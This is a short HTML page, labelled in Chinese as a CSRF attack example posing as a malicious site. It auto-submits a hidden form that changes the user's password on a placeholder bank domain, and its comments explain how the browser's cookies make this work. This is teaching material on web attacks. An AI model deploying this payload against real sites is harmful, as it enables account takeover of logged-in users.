<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF攻击示例</title>
</head>
<body>
    <h1>欢迎来到恶意网站</h1>
    <p>点击下面的按钮，以受害者的身份向银行网站发起密码修改请求：</p>
    <form id="csrfForm" action="http://bank.com/change-password" method="post">
        <input type="hidden" name="new_password" value="恶意密码">
        <button type="submit">提交</button>
    </form>

    <script>
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>

<!-- 当用户在 normal.com 上访问 malicious.com 并点击了上面的按钮，就会向 bank.com 发送请求，从而修改了用户的密码。 -->
<!-- 该网站并没有获取 normal.com 的 user cookie，只是因为用户在 normal.com 上是登录状态，就可以通过浏览器携带合法的 cookie 去 bank.com 做 malicious.com 上指定的操作 -->
